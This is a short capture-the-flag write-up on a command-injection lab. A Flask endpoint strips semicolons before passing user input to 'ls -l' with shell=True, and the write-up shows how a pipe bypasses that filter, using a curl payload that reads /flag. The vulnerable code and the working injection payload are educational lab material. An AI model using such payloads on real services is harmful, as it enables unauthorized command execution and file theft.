# Command Injection 2

Like the previous challenge, we get a `/challenge/server` that runs a command using `subprocess.run()`. Before, we were able to control `arg`
to be anything we want it to be and it would be passed injected into `command` with no cleansing.

Now, the server replaces `;`s before `arg` gets placed in `command` so the previous attack wouldn't work.

```python
@app.route("/puzzle", methods=["GET"])
def challenge():
    arg = flask.request.args.get("directory", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

However, `;` is not the only way to chain commands. Piping is another way to get your command to run after `ls -l` runs. So, we can pass this into `arg`:

```bash
ls -l | cat /flag
     ^ start of our input
```

`cat` ignores any input from stdin if a filename is already specified, so the output of `ls -l` does nothing here. Knowing this, here is the payload we
can craft:

```bash
curl 'challenge.localhost:80/puzzle?directory=|cat%20/flag'
```

The returing html has our flag!